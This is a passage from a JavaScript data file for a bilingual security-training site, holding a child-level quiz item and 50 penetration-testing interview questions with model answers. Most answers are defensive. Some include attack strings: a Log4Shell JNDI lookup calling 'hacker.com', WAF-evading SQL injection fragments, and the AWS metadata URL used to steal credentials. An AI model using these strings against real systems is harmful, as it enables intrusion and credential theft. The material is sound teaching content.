          en: "Explain Sensitive Data Exposure to a 5-year-old using a written password note and a magic box."
        },
        keywords: [
          ["şifre", "password", "sır", "secret"],
          ["açık", "open", "plain"],
          ["karıştır", "scramble", "mix", "şifrele", "encrypt"],
          ["pencere", "cam", "window", "glass"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "Oyuncak kasamızın şifresini bir kağıda yazıp penceremize asarsak herkes görür ve veriler ifşa olur. Bunun yerine şifreyi gizli bir makineye (şifreleme) atıp karıştırırız, böylece bakanlar sadece anlamsız şekiller görür. Buna koruma denir.",
          en: "If we write our safe password on a paper and stick it on the window, everyone sees it. Instead, we put it in a magic mixer that scrambles the letters into weird shapes. Only we know the secret word."
        }
      }
    ]
  },

  // ── Tab 11: Siber Güvenlik Mülakat Soruları ──────────────────────────────
  {
    title: { tr: "💼 Mülakat Soruları (50 Soru)", en: "💼 Interview Questions (50 Qs)" },
    blocks: [
      {
        type: 'interview-questions',
        topic: 'Cyber Security & Penetration Testing',
        questions: [
          // Basic Level (1-15)
          {
            level: 'basic',
            q: { tr: "SQL Injection zafiyeti nedir ve en basit haliyle nasıl önlenir?", en: "What is SQL Injection and how can it be prevented in its simplest form?" },
            a: { tr: "SQL Injection, kullanıcının girdikleriyle SQL komutlarını manipüle etmesidir. En basit çözümü, girdileri sorgu kodundan ayıran 'Prepared Statements' (Parametrelendirilmiş Sorgular) kullanmaktır.", en: "SQL Injection happens when user inputs alter SQL query logic. The simplest prevention is utilizing Parameterized Queries (Prepared Statements) to separate parameters from instructions." }
          },
          {
            level: 'basic',
            q: { tr: "XSS (Cross-Site Scripting) zafiyeti nedir?", en: "What is Cross-Site Scripting (XSS)?" },
            a: { tr: "XSS, bir saldırganın web sayfasına kötü niyetli JavaScript kodları enjekte etmesi ve bu kodların sayfayı ziyaret eden diğer kullanıcıların tarayıcılarında çalışmasıdır.", en: "XSS is a vulnerability where an attacker injects malicious client-side scripts (typically JavaScript) into web pages, which then execute inside other visitors' browsers." }
          },
          {
            level: 'basic',
            q: { tr: "HTTP ile HTTPS arasındaki temel fark nedir?", en: "What is the primary difference between HTTP and HTTPS?" },
            a: { tr: "HTTP trafiği düz metin olarak iletir ve kolayca dinlenebilir. HTTPS ise SSL/TLS protokolü ile istemci-sunucu arasındaki tüm verileri şifreleyerek iletir, gizlilik sağlar.", en: "HTTP transmits data in cleartext, making it vulnerable to interceptors. HTTPS encrypts all network packets using SSL/TLS, assuring privacy and data integrity." }
          },
          {
            level: 'basic',
            q: { tr: "WAF (Web Application Firewall) nedir ve ne işe yarar?", en: "What is a WAF (Web Application Firewall)?" },
            a: { tr: "WAF, web uygulamasına gelen HTTP trafiğini izleyen, süzen ve SQLi veya XSS gibi bilinen siber güvenlik saldırı modellerini filtreleyip engelleyen bir güvenlik kalkanıdır.", en: "A WAF monitors, filters, and blocks malicious HTTP traffic directed at web apps, neutralizing patterns like SQL Injection or Cross-Site Scripting at the perimeter." }
          },
          {
            level: 'basic',
            q: { tr: "İki temel XSS türü olan Stored (Kalıcı) ve Reflected (Geçici) XSS farkı nedir?", en: "What is the difference between Stored and Reflected XSS?" },
            a: { tr: "Stored XSS'te zararlı kod veritabanına kaydedilir ve sayfaya giren her kullanıcıyı etkiler. Reflected XSS'te ise kod veritabanına kaydedilmez, anlık parametreyle (ör. URL parametresiyle) kurbana yansıtılır.", en: "Stored XSS saves the payload in the database, impacting every user loading that resource. Reflected XSS bounces the script off the server instantly via query parameters, targeting a specific victim link click." }
          },
          {
            level: 'basic',
            q: { tr: "Penetration Testing (Sızma Testi) ile Vulnerability Assessment (Zafiyet Tarama) arasındaki fark nedir?", en: "What is the difference between Penetration Testing and Vulnerability Assessment?" },
            a: { tr: "Vulnerability Assessment, sistemdeki açıkları otomatik araçlarla tarayıp raporlama işlemidir. Penetration Testing ise bu açıkları sömürerek (exploit) sisteme ne kadar sızılabileceğini manuel test eden süreçtir.", en: "Vulnerability Assessment is automated scanning to compile a list of known issues. Penetration Testing actively exploits identified gaps to evaluate real-world intrusion risk." }
          },
          {
            level: 'basic',
            q: { tr: "Sanitization ile Validation arasındaki fark nedir?", en: "What is the difference between input sanitization and input validation?" },
            a: { tr: "Validation, girdinin beklenen formatta (ör. geçerli email) olup olmadığını kontrol eder. Sanitization ise girdinin içindeki tehlikeli karakterleri temizler veya dönüştürür (ör. <'ü &lt; yapmak).", en: "Validation checks if input adheres to strict format rules (e.g. valid email). Sanitization strips or encodes dangerous characters (e.g. converting < into &lt;) to render it safe." }
          },
          {
            level: 'basic',
            q: { tr: "Rate Limiting nedir?", en: "What is Rate Limiting?" },
            a: { tr: "Belirli bir zaman diliminde (örneğin 1 dakika) bir IP adresinden yapılabilecek maksimum istek sayısını sınırlamaktır. Brute force ve DoS saldırılarını engellemede kullanılır.", en: "Rate Limiting constrains the maximum number of requests a client IP can trigger in a set time window, preventing brute force and Denial of Service (DoS) attempts." }
          },
          {
            level: 'basic',
            q: { tr: "Bcrypt nedir?", en: "What is Bcrypt?" },
            a: { tr: "Bcrypt, şifreleri veritabanına kaydetmeden önce güvenle şifrelemek için kullanılan, içine rastgele tuz (Salt) ekleyen tek yönlü ve yavaş çalışan bir kriptografik hash fonksiyonudur.", en: "Bcrypt is a slow, one-way cryptographic hashing function incorporating random salt values, widely used to securely store user passwords." }
          },
          {
            level: 'basic',
            q: { tr: "OWASP Top 10 nedir?", en: "What is the OWASP Top 10?" },
            a: { tr: "OWASP Top 10, web uygulamalarında en sık karşılaşılan ve etkisi en yüksek olan 10 kritik güvenlik açığını listeleyen, küresel kabul görmüş bir siber güvenlik standart rehberidir.", en: "The OWASP Top 10 is a globally recognized awareness document listing the 10 most critical security risks facing modern web applications." }
          },
          {
            level: 'basic',
            q: { tr: "CSRF (Cross-Site Request Forgery) nedir?", en: "What is CSRF (Cross-Site Request Forgery)?" },
            a: { tr: "CSRF, bir kullanıcının tarayıcısındaki aktif oturumunu kullanarak, kullanıcının bilgisi dışında sunucuya yetkisiz istekler (örneğin şifre değiştirme, para gönderme) gönderilmesidir.", en: "CSRF forces an authenticated user's browser to submit unauthorized requests to a web application they are currently logged into, exploiting cookie-based trust." }
          },
          {
            level: 'basic',
            q: { tr: "Güvenlik testlerinde 'Black Box' ile 'White Box' test yaklaşımı farkı nedir?", en: "What is the difference between Black Box and White Box security testing?" },
            a: { tr: "Black Box testte sistemin kod yapısı veya mimarisi bilinmez, dışarıdan saldırı simüle edilir. White Box testte ise kodlar, şemalar ve yetkili erişimler verilerek derinlemesine analiz yapılır.", en: "Black Box tests simulate external attacks with zero prior knowledge of code or architecture. White Box tests evaluate source code, documentation, and internal architecture directly." }
          },
          {
            level: 'basic',
            q: { tr: "Sızma testlerinde 'Burp Suite' aracı ne amaçla kullanılır?", en: "What is the purpose of Burp Suite in penetration testing?" },
            a: { tr: "Burp Suite, tarayıcı ile sunucu arasındaki trafiği yakalayan, istekleri durdurup (intercept) değiştirmeye, analiz etmeye ve zafiyet taraması yapmaya yarayan bir HTTP proxy aracıdır.", en: "Burp Suite is an HTTP proxy tool used to capture, intercept, modify, and analyze network traffic flowing between browser clients and backend API endpoints." }
          },
          {
            level: 'basic',
            q: { tr: "Güvenli yazılım geliştirmede 'Least Privilege' (En Az Yetki) prensibi nedir?", en: "What is the Principle of Least Privilege?" },
            a: { tr: "Bir kullanıcının, servisin veya uygulamanın, sadece yapması gereken işi tamamlaması için gereken en az yetki seviyesine sahip olması kuralıdır.", en: "A security design rule specifying that user accounts, code components, or APIs should only be granted the absolute minimum level of access needed to perform their task." }
          },
          {
            level: 'basic',
            q: { tr: "Sosyal Mühendislik (Phishing) nedir?", en: "What is Social Engineering (Phishing)?" },
            a: { tr: "Kullanıcıları kandırarak şifre, kredi kartı veya kimlik bilgilerini kendi elleriyle teslim etmelerini sağlayan psikolojik ikna ve sahte e-posta/web sitesi yöntemleridir.", en: "Manipulating individuals into voluntarily handing over sensitive data like passwords via deceptive emails, fake pages, or social impersonation." }
          },

          // Intermediate Level (16-35)
          {
            level: 'intermediate',
            q: { tr: "JWT token'lardaki 'Signature' kısmı nasıl oluşturulur ve ne işe yarar?", en: "How is the Signature in a JWT token created and validated?" },
            a: { tr: "Signature; Header ve Payload'ın base64 formatları birleştirilip, sunucudaki gizli bir anahtar (Secret Key) ile seçilen algoritma (HMAC, RSA) kullanılarak imzalanmasıyla üretilir. Token'ın yolda değiştirilmesini engeller.", en: "The Signature concatenates the base64-encoded Header and Payload, signing them with a server secret key using HMAC or RSA algorithms. It prevents tampering in transit." }
          },
          {
            level: 'intermediate',
            q: { tr: "IDOR zafiyetini otomasyon testlerinde yakalamak için nasıl bir strateji izlersiniz?", en: "How do you test for IDOR using test automation?" },
            a: { tr: "İki farklı kullanıcı oturumu (A ve B) oluşturulur. Test otomasyon aracı (Playwright/Selenium), Kullanıcı A'nın oturum token'ını kullanarak Kullanıcı B'ye ait bir kaynağın ID'sine istek atar ve HTTP 403 Forbidden veya 404 dönmesini bekler.", en: "You instantiate two user tokens (A and B). The test automation tool makes an API call requesting User B's resource ID using User A's token, asserting that the server returns HTTP 403 or 404." }
          },
          {
            level: 'intermediate',
            q: { tr: "SSRF (Server-Side Request Forgery) açığı bulut ortamlarında (örn. AWS) neden çok tehlikelidir?", en: "Why is SSRF exceptionally critical in cloud platforms like AWS?" },
            a: { tr: "SSRF yardımıyla sunucu AWS iç ağındaki metadata adresine (http://169.254.169.254/latest/meta-data/) yönlendirilebilir. Buradan sunucunun IAM rolü, geçici AWS erişim anahtarları ve şifreleri çalınabilir.", en: "SSRF enables query redirection to the AWS local link-local address (http://169.254.169.254). Attackers fetch temporary IAM security credentials, compromising the entire cloud cluster." }
          },
          {
            level: 'intermediate',
            q: { tr: "CSP (Content Security Policy) nedir ve XSS'e karşı nasıl koruma sağlar?", en: "What is CSP (Content Security Policy) and how does it mitigate XSS?" },
            a: { tr: "CSP, tarayıcıya sadece belirli güvenilir kaynaklardan script yüklemesini ve inline script'leri çalıştırmamasını söyleyen bir HTTP response header'ıdır. XSS injected edilse bile çalışmasını engeller.", en: "CSP is an HTTP response header that restricts the domains from which browsers can download and execute client scripts, preventing injected inline XSS from running." }
          },
          {
            level: 'intermediate',
            q: { tr: "CSRF token mekanizması nasıl çalışır?", en: "How does a CSRF token protect a form submission?" },
            a: { tr: "Sunucu kullanıcı giriş yaptığında rastgele benzersiz bir CSRF token üretip formun içine gömer. Form gönderildiğinde sunucu bu token'ı doğrular. Dış siteler bu token'ı okuyamadığı için sahte form gönderemez.", en: "The server generates a unique, unpredictable CSRF token associated with the session. Form submissions must contain this token. Attackers cannot read it, blocking forge actions." }
          },
          {
            level: 'intermediate',
            q: { tr: "JWT token'lar tarayıcıda nerede saklanmalıdır? LocalStorage mı HttpOnly Cookie mi?", en: "Where should JWT tokens be stored in the browser: LocalStorage or HttpOnly Cookie?" },
            a: { tr: "HttpOnly Cookie'ler XSS saldırılarında JavaScript kodlarıyla okunamaz, bu yüzden LocalStorage'a kıyasla çok daha güvenlidir. JWT'nin HttpOnly, Secure ve SameSite bayraklarıyla saklanması en iyi uygulamadır.", en: "HttpOnly Cookies cannot be read by JavaScript code, protecting tokens from XSS theft. Storing JWTs inside HttpOnly, Secure, and SameSite cookies is the industry best practice." }
          },
          {
            level: 'intermediate',
            q: { tr: "SQL Injection testi yaparken 'Boolean-based blind' ile 'Time-based blind' arasındaki fark nedir?", en: "What is the difference between Boolean-based and Time-based Blind SQLi?" },
            a: { tr: "Boolean-based'de sorgu sonucuna göre sayfanın içeriği değişir (true/false çıktısı verir). Time-based'de ise veri sızdırmak için sunucunun cevabı geciktirilir (ör. pg_sleep(5)), süre ölçülerek çıkarım yapılır.", en: "Boolean-based blind SQLi changes visible page content based on true/false query results. Time-based blind SQLi forces database delays (e.g. pg_sleep(5)) to deduce characters." }
          },
          {
            level: 'intermediate',
            q: { tr: "Broken Access Control (Erişim Kontrolü Hataları) ile IDOR arasındaki fark nedir?", en: "What is the difference between Broken Access Control and IDOR?" },
            a: { tr: "IDOR, yetki kontrolü eksikliğinden faydalanıp sadece veri kimliğini (ID) değiştirme durumudur. Broken Access Control ise genel bir kategoridir; yetkisiz bir kullanıcının admin paneline girmesini de kapsar.", en: "IDOR specifically targets missing authorization on resource parameters. Broken Access Control is the broader umbrella category, including vertical privilege escalation." }
          },
          {
            level: 'intermediate',
            q: { tr: "XXE (XML External Entity) saldırısı ile hangi tehlikeli eylemler yapılabilir?", en: "What severe actions can be executed via an XXE injection?" },
            a: { tr: "XXE yardımıyla sunucudaki yerel dosyalar (/etc/passwd gibi) okunabilir, iç ağdaki diğer sunuculara bağlantı kurulup taranabilir (SSRF) veya sunucu kaynakları tüketilerek servis dışı bırakılabilir (DoS).", en: "XXE injection allows reading local server config files (like /etc/passwd), scanning internal ports (SSRF), or triggering CPU resource exhaustion (DoS)." }
          },
          {
            level: 'intermediate',
            q: { tr: "Güvenlik testlerinde DAST ile SAST farkı nedir?", en: "What is the difference between DAST and SAST tools?" },
            a: { tr: "SAST (Static Application Security Testing) kaynak kodları derlemeden analiz eder (White box). DAST (Dynamic) ise uygulamayı çalışır haldeyken dışarıdan tarayarak zafiyet bulur (Black box).", en: "SAST scans source code patterns statically without compiling. DAST interacts with the running web interface externally to identify anomalies dynamically." }
          },
          {
            level: 'intermediate',
            q: { tr: "SQL Injection bypass'larında WAF filtrelerini aşmak için hangi yöntemler kullanılır?", en: "Which techniques bypass simple WAF rules in SQL Injection?" },
            a: { tr: "URL encoding, Double encoding, SQL yorum satırları arasına kod yerleştirme (ör. `UNION/**/SELECT`) ve harf büyüklüklerini karıştırma (`uNiOn sElEcT`) gibi yöntemlerle WAF kuralları aşılabilir.", en: "Applying URL encoding, double encoding, whitespace comment wrapping (`UNION/**/SELECT`), or mixed casings (`uNiOn sElEcT`) masks exploit payloads from regex filters." }
          },
          {
            level: 'intermediate',
            q: { tr: "CORS (Cross-Origin Resource Sharing) yapılandırmasında 'Access-Control-Allow-Origin: *' neden tehlikelidir?", en: "Why is Access-Control-Allow-Origin: * risky in CORS policies?" },
            a: { tr: "Bu ayar, internetteki tüm web sitelerinin bu API'ye istek yapıp cevapları okuyabilmesini sağlar. Eğer API hassas kullanıcı verileri dönüyorsa, kötü niyetli siteler kullanıcı verilerini çalabilir.", en: "Allow-Origin: * permits any external site to read HTTP responses. If the API returns credentials or user details, malicious sites easily extract private data." }
          },
          {
            level: 'intermediate',
            q: { tr: "Hassas verileri taşırken kullanılan TLS (Transport Layer Security) 1.2 ve 1.3 arasındaki farklar nelerdir?", en: "What are the core differences between TLS 1.2 and TLS 1.3?" },
            a: { tr: "TLS 1.3 daha hızlıdır (handshake süresi yarıya düşer - 1-RTT). Güvenliği zayıf olan eski şifreleme algoritmalarını (RC4, SHA-1, MD5, DES) kaldırarak sistemi daha güvenli hale getirir.", en: "TLS 1.3 accelerates connection speeds (cutting handshakes to 1-RTT) and deprecates insecure legacy cipher suites (RC4, MD5, DES, SHA-1)." }
          },
          {
            level: 'intermediate',
            q: { tr: "API Güvenliğinde 'Broken Object Level Authorization' (BOLA) nedir? IDOR ile aynı mıdır?", en: "What is BOLA in API security and is it identical to IDOR?" },
            a: { tr: "Evet, BOLA, API dünyasındaki IDOR'ın yeni adıdır. Kullanıcının istek parametrelerindeki nesne ID'lerini değiştirerek yetkisi olmayan verilere erişebilmesini ifade eder.", en: "Yes, BOLA is the API-centric term for IDOR. It occurs when endpoint logic fails to validate if the requester owns the object identified by the parameter." }
          },
          {
            level: 'intermediate',
            q: { tr: "Bir web sitesinde JWT token kullanılıyor. Token'ın süresi (exp) çok uzun tutulursa ne gibi bir risk oluşur?", en: "What security risk occurs if JWT expiration time (exp) is too long?" },
            a: { tr: "Token çalınırsa, saldırgan token süresi dolana kadar hesabı kontrol eder. Kısa ömürlü access token (15 dk) ve uzun ömürlü, sunucudan iptal edilebilir refresh token kullanmak en doğrusudur.", en: "If captured, the thief retains access for days. Best practice uses short-lived access tokens (15m) paired with server-revocable refresh tokens." }
          },
          {
            level: 'intermediate',
            q: { tr: "Güvenlik testlerinde 'Privilege Escalation' (Yetki Yükseltme) nedir?", en: "What is Privilege Escalation in security assessments?" },
            a: { tr: "Kullanıcının sisteme sızdıktan sonra yetkilerini artırmasıdır. Yatay yetki yükseltme (IDOR ile başka kullanıcının verisini okuma) veya Dikey yetki yükseltme (normal kullanıcının admin olması) şeklinde olur.", en: "Securing higher control permissions than initially authorized: vertical (standard user becoming admin) or horizontal (accessing peer resources)." }
          },
          {
            level: 'intermediate',
            q: { tr: "XSS koruması için sadece girdileri filtrelemek (input filtering) neden yeterli değildir?", en: "Why is input filtering alone insufficient for XSS defense?" },
            a: { tr: "Çünkü veritabanına doğrudan veya üçüncü parti API'lerden gelen kirli veriler de sisteme sızabilir. En güvenli yol, verinin sayfaya yazdırıldığı çıkış anında HTML encoding (output encoding) yapmaktır.", en: "Malicious payloads can enter via DB seeding or external APIs. Output encoding (HTML escaping when rendering data) is the mandatory defense line." }
          },
          {
            level: 'intermediate',
            q: { tr: "REST API testlerinde hangi HTTP durum kodları yetkilendirme (authorization) ve kimlik doğrulama (authentication) hatalarını gösterir?", en: "Which HTTP status codes indicate authentication and authorization failures in API tests?" },
            a: { tr: "HTTP 401 Unauthorized: Kimliğin doğrulanmadığını (login olmadığını) belirtir. HTTP 403 Forbidden: Kimlik doğru ancak kullanıcının o kaynağa erişim yetkisinin olmadığını belirtir.", en: "HTTP 401 Unauthorized signifies missing or invalid credentials (authentication). HTTP 403 Forbidden indicates valid login but insufficient access rights (authorization)." }
          },
          {
            level: 'intermediate',
            q: { tr: "SQL Injection'a karşı veritabanı seviyesinde hangi yetkilendirme kısıtı (Least Privilege) uygulanmalıdır?", en: "What database-level permission restriction protects against catastrophic SQLi?" },
            a: { tr: "Web uygulamasının veritabanına bağlandığı kullanıcının yetkileri kısıtlanmalıdır. Sadece SELECT, INSERT, UPDATE verilmeli; admin yetkileri (DROP TABLE, ALTER) ve sistem dosyalarına erişim kapatılmalıdır.", en: "The database user used by the app should restrict drop/alter access, granting only SELECT/INSERT privileges and disabling system commands." }
          },
          {
            level: 'intermediate',
            q: { tr: "Clickjacking saldırısı nedir ve nasıl engellenir?", en: "What is Clickjacking and how is it prevented?" },
            a: { tr: "Kullanıcıya şeffaf bir iFrame göstererek, onun aslında başka bir sayfadaki görünmez butonlara (örn. satın al, sil) tıklamasını sağlamaktır. `X-Frame-Options: DENY` header'ı ile sitenin iFrame içine alınması engellenir.", en: "Layering a transparent frame over a decoy button to trick users into clicking hidden links. Mitigated by setting HTTP header `X-Frame-Options: DENY`." }
          },

          // Advanced Level (36-50)
          {
            level: 'advanced',
            q: { tr: "Insecure Deserialization zafiyeti Java ve Python uygulamalarında nasıl tetiklenir?", en: "How is Insecure Deserialization exploited in Java and Python?" },
            a: { tr: "Java'da nesneler ObjectInputStream readObject() ile deserialize edilirken, Python'da pickle.loads() kullanılır. Saldırgan bu veri akışının içine sistem komutu çalıştıracak (RCE) sahte gadget nesneleri yerleştirir.", en: "Java reconstructs objects via ObjectInputStream readObject(), and Python uses pickle.loads(). Attackers embed gadget chains in byte streams to trigger Remote Code Execution." }
          },
          {
            level: 'advanced',
            q: { tr: "Güvenlik otomasyon test zincirinizde (DevSecOps) SAST ve DAST araçlarını CI/CD pipeline'ına nasıl entegre edersiniz?", en: "How do you integrate SAST and DAST tools into a CI/CD pipeline (DevSecOps)?" },
            a: { tr: "SAST (örn. SonarQube, Semgrep) kod commit aşamasında veya PR açıldığında çalıştırılır. DAST (örn. OWASP ZAP) ise staging ortamına kod deploy edildikten sonra entegrasyon testlerinin bir parçası olarak tetiklenir.", en: "SAST run during code commit phases (PR reviews). DAST (like OWASP ZAP) executes post-deployment in staging containers, running active vulnerability scans." }
          },
          {
            level: 'advanced',
            q: { tr: "İş Mantığı Hatalarını (Business Logic Flaws) test ederken otomasyon mühendislerinin yapması gereken en kritik 'Race Condition' testi nedir?", en: "What is a 'Race Condition' test in business logic automation?" },
            a: { tr: "Race Condition, iki paralel isteğin aynı anda gönderilerek veritabanı kilitlenme anının sömürülmesidir. Örneğin, bakiyesi 100 TL olan hesaptan aynı milisaniyede 2 adet 100 TL çekme isteği gönderilerek bakiye eksiye düşürülmeye çalışılır.", en: "Race condition tests send simultaneous parallel threads. For example, triggering two $100 withdrawal requests in the same millisecond to abuse timing checks and drop balances negative." }
          },
          {
            level: 'advanced',
            q: { tr: "XML okuyucularda (XML Parser) XXE zafiyetini engellemek için Java kodunda hangi özellikler (features) setClass edilmelidir?", en: "Which Java features must be configured to block XXE in XML parsers?" },
            a: { tr: "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\ndbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\ndbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);", en: "Disable DOCTYPE and external general entities: \nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\ndbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);" }
          },
          {
            level: 'advanced',
            q: { tr: "Log Injection (Log Kaydı Enjeksiyonu) nedir ve Log4Shell (CVE-2021-44228) zafiyeti ile ilişkisi nedir?", en: "What is Log Injection and how does it relate to the Log4Shell vulnerability?" },
            a: { tr: "Log Injection, kullanıcı girdilerinin temizlenmeden log dosyalarına yazılmasıdır. Log4Shell zafiyetinde, loglama kütüphanesi (Log4j) gelen `${jndi:ldap://hacker.com/a}` ifadesini görünce LDAP sunucusuna gidip kodu çalıştırır.", en: "Log Injection prints raw inputs to log logs. In Log4Shell, Log4j parsed LDAP syntax expressions dynamically, retrieving and running rogue Java classes." }
          },
          {
            level: 'advanced',
            q: { tr: "SSRF zafiyetini önlemek için ağ seviyesinde (Network level) ne gibi mimari önlemler alınmalıdır?", en: "What network-level controls neutralize SSRF attempts?" },
            a: { tr: "Sunucunun dış dünyayla konuşan katmanından (DMZ) iç ağdaki hassas kaynaklara (local database, admin konsollar) giden bağlantılar güvenlik duvarı (Firewall) kurallarıyla tamamen engellenmelidir.", en: "Implement strict firewall egress filtering on application servers, prohibiting outgoing calls to localhost, local subnet IPs, and metadata addresses." }
          },
          {
            level: 'advanced',
            q: { tr: "CI/CD süreçlerinde (Github Actions, Jenkins) API Key ve veritabanı şifreleri (secrets) nasıl güvenli yönetilir?", en: "How should secrets be managed securely in CI/CD environments?" },
            a: { tr: "Şifreler asla kod deposuna (git) yazılmaz. Github Secrets gibi şifreli kasalarda saklanır. Derleme anında ortamsal değişken (env) olarak uygulamaya enjekte edilir ve log çıktılarında maskelenir.", en: "Never hardcode keys in git. Use encrypted credential stores (GitHub Secrets). Inject them during runtime steps as environment variables, and mask log streams." }
          },
          {
            level: 'advanced',
            q: { tr: "JWT token'larımızı imzalamak için HS256 (Simetrik) yerine RS256 (Asimetrik) kullanmak neden daha güvenlidir?", en: "Why is RS256 (Asymmetric) signing preferred over HS256 (Symmetric) for JWTs?" },
            a: { tr: "HS256'da hem imzalayan hem doğrulayan aynı gizli anahtarı bilir. RS256'da ise sunucu gizli anahtarla (Private Key) imzalar, mikroservisler ise açık anahtarla (Public Key) doğrular. Şifrenin sızma ihtimali azalır.", en: "HS256 uses a shared secret. If a resource server is compromised, the secret leaks. RS256 signs with a private key, and validates using only public keys." }
          },
          {
            level: 'advanced',
            q: { tr: "SQL Injection tespitinde kullanılan 'Out-of-band' (OOB) tekniği nedir?", en: "What is Out-of-Band (OOB) SQL Injection?" },
            a: { tr: "blind SQLi durumlarında sunucunun cevabı dönmediği ve süre ölçümünün engellendiği durumlarda verileri çalmak için, SQL içinden dns/http isteği tetiklenerek verinin dış dünyaya gönderilmesini sağlayan tekniktir.", en: "OOB SQLi triggers secondary network requests (e.g. DNS or HTTP calls from inside the database engine) to exfiltrate extracted database strings." }
          },
          {
            level: 'advanced',
            q: { tr: "Java uygulamalarında deserialization güvenliği için 'Serialization Filtering' (JEP 290) nasıl çalışır?", en: "How does Serialization Filtering (JEP 290) secure Java apps?" },
            a: { tr: "JEP 290, serileştirilmiş veri akışını okumadan önce devreye giren bir filtredir. Sadece izin verilen sınıfların (allowlist) deserialize edilmesini sağlar, tehlikeli sınıfları (gadgets) engeller.", en: "JEP 290 intercepts incoming byte streams before instantiation, restricting deserialization to an explicit allowlist of approved classes." }
          },
          {
            level: 'advanced',
            q: { tr: "Hassas verilerin güvenliği için HTTPS haricinde HSTS (HTTP Strict Transport Security) header'ı neden eklenmelidir?", en: "Why should HSTS (HTTP Strict Transport Security) be enforced?" },
            a: { tr: "HSTS header'ı, tarayıcıya bu siteyle asla güvensiz HTTP üzerinden konuşmamasını söyler. Kullanıcı adresi http:// olarak yazsa bile tarayıcı bunu otomatik olarak https://'e yönlendirir (SSL Strip engelleme).", en: "HSTS forces browsers to connect exclusively over HTTPS. Even if users enter an HTTP link, the browser performs a local upgrade, preventing SSL stripping." }
          },
          {
            level: 'advanced',
            q: { tr: "Uygulamada şifre doğrulama (Authentication) yaparken 'Timing Attack' nedir ve kod seviyesinde nasıl engellenir?", en: "What is a timing attack on password verification and how is it fixed?" },
            a: { tr: "Timing Attack, şifre karşılaştırma işleminin (örneğin karakter karakter kontrol etme) ne kadar sürdüğünü ölçerek şifreyi tahmin etmektir. `MessageDigest.isEqual()` gibi sabit zamanlı (constant-time) eşitleme kullanılır.", en: "A timing attack infers characters of a secret by measuring search execution time. Mitigated by using constant-time string comparison methods like MessageDigest.isEqual()." }
          },
          {
            level: 'advanced',
            q: { tr: "JSON Web Token (JWT) tabanlı sistemlerde 'Token Sidejacking' ve 'Replay Attack' nasıl engellenir?", en: "How do you defend against JWT Sidejacking and Replay attacks?" },
            a: { tr: "Token'lara kısa ömür (exp), benzersiz ID (jti) verilmeli ve bu ID'ler tek kullanımlık (one-time usage) olacak şekilde sunucuda kontrol edilmelidir. Ayrıca HTTPS üzerinden HttpOnly, Secure cookie'ler kullanılmalıdır.", en: "Enforce brief expiration times, unique token identifiers (jti) tracked on backend caches to reject reuse, and transport solely over TLS with HttpOnly flags." }
          },
          {
            level: 'advanced',
            q: { tr: "API Gateway katmanında 'OAuth 2.0 Scope' kontrolleri nasıl kurgulanmalıdır?", en: "How should OAuth 2.0 Scopes be implemented at the API Gateway level?" },
            a: { tr: "API Gateway gelen access token'ı okur, içindeki scope yetkilerini (ör. `read:invoices`, `write:users`) doğrular. İstek yapılan API path'i ile bu yetkiler eşleşmezse isteği sunucuya iletmeden engeller.", en: "The API Gateway validates JWT scopes (e.g. `read:invoices`). If the target path doesn't align with token scopes, the gateway drops the request before routing it." }
          },
          {
            level: 'advanced',
            q: { tr: "Sızma testlerinde 'Subdomain Takeover' zafiyeti nasıl oluşur ve otomasyonla nasıl tespit edilir?", en: "What is a Subdomain Takeover and how is it detected automatically?" },
            a: { tr: "Bir alt alan adının (subdomain) DNS kaydı (CNAME) harici bir servise (örn. Github Pages, Heroku) yönlendirilmiştir ancak o servis silinmiştir. Saldırgan o servise gidip subdomain'i kendi adına kaydeder. CNAME DNS kayıtları taranarak tespit edilir.", en: "Occurs when a DNS record points to an abandoned external cloud service. Attackers claim the domain on the provider. Detected by automating CNAME record scanning." }
          }
        ]
      }
    ]
  }
]

export const securityData = {
  tr: { hero: trHero, tabs: trTabs, sections },
  en: { hero: enHero, tabs: enTabs, sections }
}
